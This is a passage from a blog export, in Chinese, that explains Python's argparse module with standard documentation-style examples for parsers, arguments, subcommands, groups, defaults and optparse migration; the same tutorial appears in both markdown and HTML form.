在解析器级别给参数设置默认值(优先级高于在add_argument方法中的设置)，也可以获取默认值。\n\n    ArgumentParser.**set_defaults**(**kwargs)       # 设置默认值\n\n    ArgumentParser.**get_default**(dest)            # 获取默认值\n\n    ```python\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('foo', type=int)\n    >>> parser.set_defaults(bar=42, baz='badger')   # 不审查是否在命令行中声明，故而bar，baz可以直接添加\n    >>> parser.parse_args(['736'])\n    Namespace(bar=42, baz='badger', foo=736)\n\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('--foo', default='bar') # 解析器级别默认值总是覆盖参数级别默认值\n    >>> parser.set_defaults(foo='spam')\n    >>> parser.parse_args([])\n    Namespace(foo='spam')\n\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('--foo', default='badger')\n    >>> parser.get_default('foo')                   # 获取默认值\n    'badger'\n\n    ```\n\n- ### [打印帮忙](https://docs.python.org/3/library/argparse.html#printing-help)\n    用于打印帮助信息。\n\n    ArgumentParser.**print_usage**(file=None)\n\n    ArgumentParser.**print_help**(file=None)\n\n    ArgumentParser.**format_usage**()\n\n    ArgumentParser.**format_help**()\n\n- ### [部分解析](https://docs.python.org/3/library/argparse.html#partial-parsing)\n    有些脚本只解析部分参数，放过其余的参数以便传递给其它脚本或程序。 这种情况下使用 parse_known_args() 。跟parse_args()用法一样，但当参数过多的情况下并不会报错，而是将多余的参数放到一个新的tuple中。\n\n    ArgumentParser.**parse_known_args**(args=None, namespace=None)\n\n    ```python\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('--foo', action='store_true')\n    >>> parser.add_argument('bar')\n    >>> parser.parse_known_args(['--foo', '--badger', 'BAR', 'spam'])\n    (Namespace(bar='BAR', foo=True), ['--badger', 'spam'])     # ['--badger', 'spam']即为多余的参数。\n    ```\n\n- ### [自定义文件解析](https://docs.python.org/3/library/argparse.html#customizing-file-parsing)\n\n- ### [退出方法](https://docs.python.org/3/library/argparse.html#exiting-methods)\n\n- ### [optparse代码升级](https://docs.python.org/3/library/argparse.html#upgrading-optparse-code)\n    原本argparse是与optparse保持兼容的，但是！@#￥%……&*（。升级办法如下：\n1.    Replace all optparse.OptionParser.add_option() calls with ArgumentParser.add_argument() calls.\n2.    Replace (options, args) = parser.parse_args() with args = parser.parse_args() and add additional ArgumentParser.add_argument() calls for the positional arguments. Keep in mind that what was previously called options, now in argparse context is called args.\n3.    Replace callback actions and the callback_* keyword arguments with type or action arguments.\n4.    Replace string names for type keyword arguments with the corresponding type objects (e.g. int, float, complex, etc).\n5.    Replace optparse.Values with Namespace and optparse.OptionError and optparse.OptionValueError with ArgumentError.\n6.    Replace strings with implicit arguments such as %default or %prog with the standard Python syntax to use dictionaries to format strings, that is, %(default)s and %(prog)s.\n7.    Replace the OptionParser constructor version argument with a call to parser.add_argument('--version', action='version', version='<the version>').","source":"_posts/Python-argparse模块详解.md","raw":"---\ntitle: Python argparse模块详解\ndate: 2017-06-08 10:27:24\ntags: Python\n---\n>    argparse是python用于解析命令行参数和选项的标准模块，用于代替已经过时的optparse模块。\n>    官方文档中讲到的，本文基本都提到了，但只是简要记录，如果需要深入理解，可查看原文。   \n>    https://docs.python.org/3/library/argparse.html\n\n## 使用步骤\n```\nimport argparse                     # 导入模板\n\nparser = argparse.ArgumentParser()  # 创建parser\n\nparser.add_argument()               # 添加参数\n\nargs = parser.parse_args()          # 参数解析\n```\n<!-- more -->\n## [ArgumentParser对象](https://docs.python.org/3/library/argparse.html#argumentparser-objects)\n    class argparse.ArgumentParser(\n        prog=None,                  # 设定程序名称 (defaul: sys.argv[0])\n        usage=None,                 # 替换默认的Usage信息\n        description=None,           # 程序简要信息说明(参数说明前)\n        epilog=None,                # 附加信息说明(参数说明后)\n        parents=[],                 # 继承父解析器(parser)\n        formatter_class=argparse.HelpFormatter,     # 自定义帮忙信息显示格式(4种)\n        prefix_chars='-',           # 参数前缀符号(默认为-,如：-h/--help)\n        fromfile_prefix_chars=None, # 从文件中引用参数（与在命令行直接写作用一致，解决参数过多的情况）\n        argument_default=None,      # 可设置argparse.SUPPRESS阻止默认参数默认值\n        conflict_handler='error',   # 参数冲突处理\n        add_help=True,              # 帮助信息中默认添加\"-h, --help\"描述\n        allow_abbrev=True           # 允许参数缩写\n    )\n\n## [add_argument()方法](https://docs.python.org/3/library/argparse.html#the-add-argument-method)\n    ArgumentParser.add_argument(\n        name or flags...    # 选项的名称或列表,例如：foo/-f/--foo\n        [, action]      # 采取的基本操作\n                            store(默认)         存储参数值\n                            store_const        使用该字符串选项时，取用const值\n                            store_true         使用该字符串选项时，参数值置为True\n                            store_false        使用该字符串选项时，参数值置为False\n                            append             同一个命令行中多次使用该字符串选项时，以追加的方式将值添加到list中\n                            append_const       将多个字符串选项的const值合并到一个list\n                            count              统计选项出现的次数 （如：\"-vvv\",则最终值为3）\n                            help               parser默认会添加一个help action。(一般不用理会)\n                            version            打印版本信息\n                            也可以自定义action类\n        [, nargs]       # 该参数值要求的数量\n                            数值       指明参数个数\n                            ?         提供了参数则取参数值；\n                                        无参数但声明了选项字符串则取const值；\n                                        无参数也未声明选择字符串则取default值\n                            *         所有参数存入list\n                            +         与*类似，但参数个数不能为空\n                            argparse.REMAINDER  原封不动的记录参数到list中，通常用于将这些参数传递到其它的命令行工具。\n        [, const]       # action/nargs部分要求的常值\n                            1、当action=\"store_const\"或者\"append_const\"时需要设置\n                            2、当选项为(-f/--foo),nargs='?'，同时未提供具体参数时，取用该值。\n        [, default]     # 参数默认值\n        [, type]        # 参数类型（内建参数或者函数，也可是自定义函数）\n        [, choices]     # 允许的参数值（白名单）,tuple/range\n        [, required]    # 选项是否必须，设置为True表示选项必填。\n        [, help]        # 参数说明,可以用其它类似 %(prog)s 格式调用prog值；可设置argparse.SUPPRESS使该选项在帮助信息中不可见。\n        [, metavar]     # 定义参数在Usage信息中的名称\n        [, dest]        # 解析后的属性名称\n    )\n- ### [自定义action](https://docs.python.org/3/library/argparse.html#action-classes)\n\n    class argparse.**Action**(option_strings, dest, nargs=None, const=None, default=None, type=None, choices=None, required=False, help=None, metavar=None)\n\n## [parse_args()方法](https://docs.python.org/3/library/argparse.html#the-parse-args-method)\n    ArgumentParser.parse_args(args=None, namespace=None)\n一般情况下，我们直接使用如下命令就可以了：\n```python\n# args=None, 程序将sys.argv作为参数代入\nargs = parse.parse_args()              \n\n# 给args赋值，跳过sys.argv，主要用于测试工作，避免每次运行都输入冗长的参数。\nargs = parser.parse_args(['1', '2', '3', '4'])\n\n# namespace=custom_class，将属性分配到一个已经存在的对象中。\nparser.parse_args(args=['--foo', 'BAR'], namespace=custom_class99)\n```\n\n## [其它工具](https://docs.python.org/3/library/argparse.html#other-utilities)\n\n- ### [子命令](https://docs.python.org/3/library/argparse.html#sub-commands)\n    很多程序把它的功能分到几个子程序中，比如：pip install , pip download , pip uninstall 等. 通过这种方式，可以很方便处理不同程序的参数。\n\n    ArgumentParser.**add_subparsers**([title][, description][, prog][, parser_class][, action][, option_string][, dest][, help][, metavar])\n\n    ```python\n    >>> parser = argparse.ArgumentParser()\n    >>> subparsers = parser.add_subparsers(dest='subparser_name')\n    >>> subparser1 = subparsers.add_parser('1')\n    >>> subparser1.add_argument('-x')\n    >>> subparser2 = subparsers.add_parser('2')\n    >>> subparser2.add_argument('y')\n    >>> parser.parse_args(['2', 'frobble'])\n    Namespace(subparser_name='2', y='frobble')\n\n    ```\n\n\n- ### [文件类型对象](https://docs.python.org/3/library/argparse.html#filetype-objects)\n    add_argument()中的FileType的参数\"工厂\"。\n\n    class argparse.**FileType**(mode='r', bufsize=-1, encoding=None, errors=None)\n    ```python\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('--raw', type=argparse.FileType('wb', 0))\n    >>> parser.add_argument('out', type=argparse.FileType('w', encoding='UTF-8'))\n    >>> parser.parse_args(['--raw', 'raw.dat', 'file.txt'])\n    Namespace(out=<_io.TextIOWrapper name='file.txt' mode='w' encoding='UTF-8'>, raw=<_io.FileIO name='raw.dat' mode='wb'>)\n\n    ```\n\n- ### [参数分组](https://docs.python.org/3/library/argparse.html#argument-groups)\n    在Usage信息中的参数分组，如pip -h可以看到\"Commands\",\"General Options\"分组。\n\n    ArgumentParser.**add_argument_group**(title=None, description=None)\n\n    ```python\n    >>> parser = argparse.ArgumentParser(prog='testPROG', add_help=False)\n    >>> group1 = parser.add_argument_group('group1', 'group1 description')\n    >>> group1.add_argument('foo', help='foo help')\n    >>> group2 = parser.add_argument_group('group2', 'group2 description')\n    >>> group2.add_argument('--bar', help='bar help')\n    \n    >>> parser.print_help()\n    \n    usage: testPROG [--bar BAR] foo\n\n    group1:\n    group1 description\n\n    foo    foo help\n\n    group2:\n    group2 description\n\n    --bar BAR  bar help\n    ```\n\n- ### [互斥](https://docs.python.org/3/library/argparse.html#mutual-exclusion)\n    参数互斥！\n\n    ArgumentParser.**add_mutually_exclusive_group**(required=False)\n\n    ```python\n    >>> parser = argparse.ArgumentParser(prog='PROG')\n    >>> group = parser.add_mutually_exclusive_group(required=True)\n    >>> group.add_argument('--foo', action='store_true')\n    >>> group.add_argument('--bar', action='store_false')\n    >>> parser.parse_args([])\n    usage: PROG [-h] (--foo | --bar)\n    PROG: error: one of the arguments --foo --bar is required\n    ```\n\n- ### [解析器默认配置](https://docs.python.org/3/library/argparse.html#parser-defaults)\n    在解析器级别给参数设置默认值(优先级高于在add_argument方法中的设置)，也可以获取默认值。\n\n    ArgumentParser.**set_defaults**(**kwargs)       # 设置默认值\n\n    ArgumentParser.**get_default**(dest)            # 获取默认值\n\n    ```python\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('foo', type=int)\n    >>> parser.set_defaults(bar=42, baz='badger')   # 不审查是否在命令行中声明，故而bar，baz可以直接添加\n    >>> parser.parse_args(['736'])\n    Namespace(bar=42, baz='badger', foo=736)\n\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('--foo', default='bar') # 解析器级别默认值总是覆盖参数级别默认值\n    >>> parser.set_defaults(foo='spam')\n    >>> parser.parse_args([])\n    Namespace(foo='spam')\n\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('--foo', default='badger')\n    >>> parser.get_default('foo')                   # 获取默认值\n    'badger'\n\n    ```\n\n- ### [打印帮忙](https://docs.python.org/3/library/argparse.html#printing-help)\n    用于打印帮助信息。\n\n    ArgumentParser.**print_usage**(file=None)\n\n    ArgumentParser.**print_help**(file=None)\n\n    ArgumentParser.**format_usage**()\n\n    ArgumentParser.**format_help**()\n\n- ### [部分解析](https://docs.python.org/3/library/argparse.html#partial-parsing)\n    有些脚本只解析部分参数，放过其余的参数以便传递给其它脚本或程序。 这种情况下使用 parse_known_args() 。跟parse_args()用法一样，但当参数过多的情况下并不会报错，而是将多余的参数放到一个新的tuple中。\n\n    ArgumentParser.**parse_known_args**(args=None, namespace=None)\n\n    ```python\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('--foo', action='store_true')\n    >>> parser.add_argument('bar')\n    >>> parser.parse_known_args(['--foo', '--badger', 'BAR', 'spam'])\n    (Namespace(bar='BAR', foo=True), ['--badger', 'spam'])     # ['--badger', 'spam']即为多余的参数。\n    ```\n\n- ### [自定义文件解析](https://docs.python.org/3/library/argparse.html#customizing-file-parsing)\n\n- ### [退出方法](https://docs.python.org/3/library/argparse.html#exiting-methods)\n\n- ### [optparse代码升级](https://docs.python.org/3/library/argparse.html#upgrading-optparse-code)\n    原本argparse是与optparse保持兼容的，但是！@#￥%……&*（。升级办法如下：\n1.    Replace all optparse.OptionParser.add_option() calls with ArgumentParser.add_argument() calls.\n2.    Replace (options, args) = parser.parse_args() with args = parser.parse_args() and add additional ArgumentParser.add_argument() calls for the positional arguments. Keep in mind that what was previously called options, now in argparse context is called args.\n3.    Replace callback actions and the callback_* keyword arguments with type or action arguments.\n4.    Replace string names for type keyword arguments with the corresponding type objects (e.g. int, float, complex, etc).\n5.    Replace optparse.Values with Namespace and optparse.OptionError and optparse.OptionValueError with ArgumentError.\n6.    Replace strings with implicit arguments such as %default or %prog with the standard Python syntax to use dictionaries to format strings, that is, %(default)s and %(prog)s.\n7.    Replace the OptionParser constructor version argument with a call to parser.add_argument('--version', action='version', version='<the version>').","slug":"Python-argparse模块详解","published":1,"updated":"2017-06-08T13:15:02.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj5lo6hsj0006vquvjsrbydmc","content":"<blockquote>\n<p>   argparse是python用于解析命令行参数和选项的标准模块，用于代替已经过时的optparse模块。<br>   官方文档中讲到的，本文基本都提到了，但只是简要记录，如果需要深入理解，可查看原文。<br>   <a href=\"https://docs.python.org/3/library/argparse.html\" target=\"_blank\" rel=\"external\">https://docs.python.org/3/library/argparse.html</a></p>\n</blockquote>\n<h2 id=\"使用步骤\"><a href=\"#使用步骤\" class=\"headerlink\" title=\"使用步骤\"></a>使用步骤</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">import argparse                     # 导入模板</div><div class=\"line\"></div><div class=\"line\">parser = argparse.ArgumentParser()  # 创建parser</div><div class=\"line\"></div><div class=\"line\">parser.add_argument()               # 添加参数</div><div class=\"line\"></div><div class=\"line\">args = parser.parse_args()          # 参数解析</div></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h2 id=\"ArgumentParser对象\"><a href=\"#ArgumentParser对象\" class=\"headerlink\" title=\"ArgumentParser对象\"></a><a href=\"https://docs.python.org/3/library/argparse.html#argumentparser-objects\" target=\"_blank\" rel=\"external\">ArgumentParser对象</a></h2><pre><code>class argparse.ArgumentParser(\n    prog=None,                  # 设定程序名称 (defaul: sys.argv[0])\n    usage=None,                 # 替换默认的Usage信息\n    description=None,           # 程序简要信息说明(参数说明前)\n    epilog=None,                # 附加信息说明(参数说明后)\n    parents=[],                 # 继承父解析器(parser)\n    formatter_class=argparse.HelpFormatter,     # 自定义帮忙信息显示格式(4种)\n    prefix_chars=&apos;-&apos;,           # 参数前缀符号(默认为-,如：-h/--help)\n    fromfile_prefix_chars=None, # 从文件中引用参数（与在命令行直接写作用一致，解决参数过多的情况）\n    argument_default=None,      # 可设置argparse.SUPPRESS阻止默认参数默认值\n    conflict_handler=&apos;error&apos;,   # 参数冲突处理\n    add_help=True,              # 帮助信息中默认添加&quot;-h, --help&quot;描述\n    allow_abbrev=True           # 允许参数缩写\n)\n</code></pre><h2 id=\"add-argument-方法\"><a href=\"#add-argument-方法\" class=\"headerlink\" title=\"add_argument()方法\"></a><a href=\"https://docs.python.org/3/library/argparse.html#the-add-argument-method\" target=\"_blank\" rel=\"external\">add_argument()方法</a></h2><pre><code>ArgumentParser.add_argument(\n    name or flags...    # 选项的名称或列表,例如：foo/-f/--foo\n    [, action]      # 采取的基本操作\n                        store(默认)         存储参数值\n                        store_const        使用该字符串选项时，取用const值\n                        store_true         使用该字符串选项时，参数值置为True\n                        store_false        使用该字符串选项时，参数值置为False\n                        append             同一个命令行中多次使用该字符串选项时，以追加的方式将值添加到list中\n                        append_const       将多个字符串选项的const值合并到一个list\n                        count              统计选项出现的次数 （如：&quot;-vvv&quot;,则最终值为3）\n                        help               parser默认会添加一个help action。(一般不用理会)\n                        version            打印版本信息\n                        也可以自定义action类\n    [, nargs]       # 该参数值要求的数量\n                        数值       指明参数个数\n                        ?         提供了参数则取参数值；\n                                    无参数但声明了选项字符串则取const值；\n                                    无参数也未声明选择字符串则取default值\n                        *         所有参数存入list\n                        +         与*类似，但参数个数不能为空\n                        argparse.REMAINDER  原封不动的记录参数到list中，通常用于将这些参数传递到其它的命令行工具。\n    [, const]       # action/nargs部分要求的常值\n                        1、当action=&quot;store_const&quot;或者&quot;append_const&quot;时需要设置\n                        2、当选项为(-f/--foo),nargs=&apos;?&apos;，同时未提供具体参数时，取用该值。\n    [, default]     # 参数默认值\n    [, type]        # 参数类型（内建参数或者函数，也可是自定义函数）\n    [, choices]     # 允许的参数值（白名单）,tuple/range\n    [, required]    # 选项是否必须，设置为True表示选项必填。\n    [, help]        # 参数说明,可以用其它类似 %(prog)s 格式调用prog值；可设置argparse.SUPPRESS使该选项在帮助信息中不可见。\n    [, metavar]     # 定义参数在Usage信息中的名称\n    [, dest]        # 解析后的属性名称\n)\n</code></pre><ul>\n<li><h3 id=\"自定义action\"><a href=\"#自定义action\" class=\"headerlink\" title=\"自定义action\"></a><a href=\"https://docs.python.org/3/library/argparse.html#action-classes\" target=\"_blank\" rel=\"external\">自定义action</a></h3><p>  class argparse.<strong>Action</strong>(option_strings, dest, nargs=None, const=None, default=None, type=None, choices=None, required=False, help=None, metavar=None)</p>\n</li>\n</ul>\n<h2 id=\"parse-args-方法\"><a href=\"#parse-args-方法\" class=\"headerlink\" title=\"parse_args()方法\"></a><a href=\"https://docs.python.org/3/library/argparse.html#the-parse-args-method\" target=\"_blank\" rel=\"external\">parse_args()方法</a></h2><pre><code>ArgumentParser.parse_args(args=None, namespace=None)\n</code></pre><p>一般情况下，我们直接使用如下命令就可以了：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># args=None, 程序将sys.argv作为参数代入</span></div><div class=\"line\">args = parse.parse_args()              </div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 给args赋值，跳过sys.argv，主要用于测试工作，避免每次运行都输入冗长的参数。</span></div><div class=\"line\">args = parser.parse_args([<span class=\"string\">'1'</span>, <span class=\"string\">'2'</span>, <span class=\"string\">'3'</span>, <span class=\"string\">'4'</span>])</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># namespace=custom_class，将属性分配到一个已经存在的对象中。</span></div><div class=\"line\">parser.parse_args(args=[<span class=\"string\">'--foo'</span>, <span class=\"string\">'BAR'</span>], namespace=custom_class99)</div></pre></td></tr></table></figure></p>\n<h2 id=\"其它工具\"><a href=\"#其它工具\" class=\"headerlink\" title=\"其它工具\"></a><a href=\"https://docs.python.org/3/library/argparse.html#other-utilities\" target=\"_blank\" rel=\"external\">其它工具</a></h2><ul>\n<li><h3 id=\"子命令\"><a href=\"#子命令\" class=\"headerlink\" title=\"子命令\"></a><a href=\"https://docs.python.org/3/library/argparse.html#sub-commands\" target=\"_blank\" rel=\"external\">子命令</a></h3><p>  很多程序把它的功能分到几个子程序中，比如：pip install , pip download , pip uninstall 等. 通过这种方式，可以很方便处理不同程序的参数。</p>\n<p>  ArgumentParser.<strong>add_subparsers</strong>([title][, description][, prog][, parser_class][, action][, option_string][, dest][, help][, metavar])</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparsers = parser.add_subparsers(dest=<span class=\"string\">'subparser_name'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparser1 = subparsers.add_parser(<span class=\"string\">'1'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparser1.add_argument(<span class=\"string\">'-x'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparser2 = subparsers.add_parser(<span class=\"string\">'2'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparser2.add_argument(<span class=\"string\">'y'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([<span class=\"string\">'2'</span>, <span class=\"string\">'frobble'</span>])</div><div class=\"line\">Namespace(subparser_name=<span class=\"string\">'2'</span>, y=<span class=\"string\">'frobble'</span>)</div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"文件类型对象\"><a href=\"#文件类型对象\" class=\"headerlink\" title=\"文件类型对象\"></a><a href=\"https://docs.python.org/3/library/argparse.html#filetype-objects\" target=\"_blank\" rel=\"external\">文件类型对象</a></h3><p>  add_argument()中的FileType的参数”工厂”。</p>\n<p>  class argparse.<strong>FileType</strong>(mode=’r’, bufsize=-1, encoding=None, errors=None)</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'--raw'</span>, type=argparse.FileType(<span class=\"string\">'wb'</span>, <span class=\"number\">0</span>))</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'out'</span>, type=argparse.FileType(<span class=\"string\">'w'</span>, encoding=<span class=\"string\">'UTF-8'</span>))</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([<span class=\"string\">'--raw'</span>, <span class=\"string\">'raw.dat'</span>, <span class=\"string\">'file.txt'</span>])</div><div class=\"line\">Namespace(out=&lt;_io.TextIOWrapper name=<span class=\"string\">'file.txt'</span> mode=<span class=\"string\">'w'</span> encoding=<span class=\"string\">'UTF-8'</span>&gt;, raw=&lt;_io.FileIO name=<span class=\"string\">'raw.dat'</span> mode=<span class=\"string\">'wb'</span>&gt;)</div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"参数分组\"><a href=\"#参数分组\" class=\"headerlink\" title=\"参数分组\"></a><a href=\"https://docs.python.org/3/library/argparse.html#argument-groups\" target=\"_blank\" rel=\"external\">参数分组</a></h3><p>  在Usage信息中的参数分组，如pip -h可以看到”Commands”,”General Options”分组。</p>\n<p>  ArgumentParser.<strong>add_argument_group</strong>(title=None, description=None)</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser(prog=<span class=\"string\">'testPROG'</span>, add_help=<span class=\"keyword\">False</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group1 = parser.add_argument_group(<span class=\"string\">'group1'</span>, <span class=\"string\">'group1 description'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group1.add_argument(<span class=\"string\">'foo'</span>, help=<span class=\"string\">'foo help'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group2 = parser.add_argument_group(<span class=\"string\">'group2'</span>, <span class=\"string\">'group2 description'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group2.add_argument(<span class=\"string\">'--bar'</span>, help=<span class=\"string\">'bar help'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.print_help()</div><div class=\"line\"></div><div class=\"line\">usage: testPROG [--bar BAR] foo</div><div class=\"line\"></div><div class=\"line\">group1:</div><div class=\"line\">group1 description</div><div class=\"line\"></div><div class=\"line\">foo    foo help</div><div class=\"line\"></div><div class=\"line\">group2:</div><div class=\"line\">group2 description</div><div class=\"line\"></div><div class=\"line\">--bar BAR  bar help</div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"互斥\"><a href=\"#互斥\" class=\"headerlink\" title=\"互斥\"></a><a href=\"https://docs.python.org/3/library/argparse.html#mutual-exclusion\" target=\"_blank\" rel=\"external\">互斥</a></h3><p>  参数互斥！</p>\n<p>  ArgumentParser.<strong>add_mutually_exclusive_group</strong>(required=False)</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser(prog=<span class=\"string\">'PROG'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group = parser.add_mutually_exclusive_group(required=<span class=\"keyword\">True</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group.add_argument(<span class=\"string\">'--foo'</span>, action=<span class=\"string\">'store_true'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group.add_argument(<span class=\"string\">'--bar'</span>, action=<span class=\"string\">'store_false'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([])</div><div class=\"line\">usage: PROG [-h] (--foo | --bar)</div><div class=\"line\">PROG: error: one of the arguments --foo --bar <span class=\"keyword\">is</span> required</div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"解析器默认配置\"><a href=\"#解析器默认配置\" class=\"headerlink\" title=\"解析器默认配置\"></a><a href=\"https://docs.python.org/3/library/argparse.html#parser-defaults\" target=\"_blank\" rel=\"external\">解析器默认配置</a></h3><p>  在解析器级别给参数设置默认值(优先级高于在add_argument方法中的设置)，也可以获取默认值。</p>\n<p>  ArgumentParser.<strong>set_defaults</strong>(**kwargs)       # 设置默认值</p>\n<p>  ArgumentParser.<strong>get_default</strong>(dest)            # 获取默认值</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'foo'</span>, type=int)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.set_defaults(bar=<span class=\"number\">42</span>, baz=<span class=\"string\">'badger'</span>)   <span class=\"comment\"># 不审查是否在命令行中声明，故而bar，baz可以直接添加</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([<span class=\"string\">'736'</span>])</div><div class=\"line\">Namespace(bar=<span class=\"number\">42</span>, baz=<span class=\"string\">'badger'</span>, foo=<span class=\"number\">736</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'--foo'</span>, default=<span class=\"string\">'bar'</span>) <span class=\"comment\"># 解析器级别默认值总是覆盖参数级别默认值</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.set_defaults(foo=<span class=\"string\">'spam'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([])</div><div class=\"line\">Namespace(foo=<span class=\"string\">'spam'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'--foo'</span>, default=<span class=\"string\">'badger'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.get_default(<span class=\"string\">'foo'</span>)                   <span class=\"comment\"># 获取默认值</span></div><div class=\"line\"><span class=\"string\">'badger'</span></div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"打印帮忙\"><a href=\"#打印帮忙\" class=\"headerlink\" title=\"打印帮忙\"></a><a href=\"https://docs.python.org/3/library/argparse.html#printing-help\" target=\"_blank\" rel=\"external\">打印帮忙</a></h3><p>  用于打印帮助信息。</p>\n<p>  ArgumentParser.<strong>print_usage</strong>(file=None)</p>\n<p>  ArgumentParser.<strong>print_help</strong>(file=None)</p>\n<p>  ArgumentParser.<strong>format_usage</strong>()</p>\n<p>  ArgumentParser.<strong>format_help</strong>()</p>\n</li>\n<li><h3 id=\"部分解析\"><a href=\"#部分解析\" class=\"headerlink\" title=\"部分解析\"></a><a href=\"https://docs.python.org/3/library/argparse.html#partial-parsing\" target=\"_blank\" rel=\"external\">部分解析</a></h3><p>  有些脚本只解析部分参数，放过其余的参数以便传递给其它脚本或程序。 这种情况下使用 parse_known_args() 。跟parse_args()用法一样，但当参数过多的情况下并不会报错，而是将多余的参数放到一个新的tuple中。</p>\n<p>  